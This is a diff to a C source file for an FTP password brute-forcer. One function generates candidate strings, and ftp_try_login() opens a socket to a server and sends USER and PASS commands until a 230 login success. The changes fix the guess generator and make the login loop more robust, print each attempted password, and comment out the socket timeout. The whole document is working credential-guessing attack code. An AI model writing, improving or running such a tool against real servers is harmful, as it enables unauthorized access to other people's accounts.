@@ -30,7 +30,8 @@ int bruteforce(char *dest, unsigned int maxlength) {
       guess_map[i + 1]++;
     }
 
-    if(i > guess_length) {
+    if(i >= guess_length) {
+      guess_map[guess_length] = 0;
       ++guess_length;
     }
 
@@ -50,6 +51,7 @@ int ftp_try_login(const char *address, unsigned int port, const char *user, cons
   struct timeval recv_timeout;
   static int tries = 0;
   static int sock = 0;
+  int length;
 
   if(sock == 0 || tries == 0) {
     recv_timeout.tv_sec = 2;
@@ -62,54 +64,64 @@ int ftp_try_login(const char *address, unsigned int port, const char *user, cons
 
     if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
       perror("ftp_try_login (socket)");
-      return 0;
+      return -1;
     }
-
+/*
     if(setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &recv_timeout, sizeof recv_timeout) == -1) {
         perror("ftp_try_login (setsockopt)");
         close(sock);
         return 0;
     }
-
+*/
     if(connect(sock, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)) < 0) {
       perror("fty_try_login (connect)");
       close(sock);
-      return 0;
+      return -1;
     }
 
-    recv(sock, answer, sizeof answer, 0);
+    if(recv(sock, answer, sizeof answer, 0) < 0) {
+      perror("ftp_try_login (recv)");
+      return -1;
+    }
+
     if(strncmp(answer, "220", 3) != 0) {
       close(sock);
       sock = 0;
-      return 0;
+      return -1;
     }
 
     tries = FTP_LOGIN_TRIES;
   }
 
-  snprintf(request, sizeof request, "USER %s\n", user);
-  if(send(sock, request, sizeof request, 0) < 0) {
+  answer[0] = '\0';
+  while(strncmp(answer, "331", 3) != 0) {
+    length = snprintf(request, sizeof request, "USER %s\n", user);
+    if(send(sock, request, length, 0) < 0) {
+      perror("fty_try_login (send)");
+      return -1;
+    }
+
+    if(recv(sock, answer, sizeof answer, 0) < 0) {
+      perror("ftp_try_login (recv)");
+      return -1;
+    }
+  }
+
+  length = snprintf(request, sizeof request, "PASS %s\n", password);
+  fprintf(stdout, "%s", request);
+  if(send(sock, request, length, 0) < 0) {
     perror("fty_try_login (send)");
-    return 0;
-  }
-  
-  recv(sock, answer, sizeof answer, 0);
-  if(strncmp(answer, "331", 3) != 0) {
-    return 0;
+    return -1;
   }
 
-  snprintf(request, sizeof request, "PASS %s\n", password);
-  if(send(sock, request, sizeof request, 0) < 0) {
-    perror("fty_try_login (send)");
-    return 0;
+  answer[0] = '\0';
+  if(recv(sock, answer, sizeof answer, 0) < 0) {
+    perror("ftp_try_login (recv)");
+    return -1;
   }
 
-  recv(sock, answer, sizeof answer, 0);
-  if(strncmp(answer, "230", 3) != 0) {
-    return 0;
-  }
-
-  return sock;
+  --tries;
+  return (strncmp(answer, "230", 3) == 0) ? sock : 0;
 }
 
 #ifdef BRUTEFORCE_MAIN
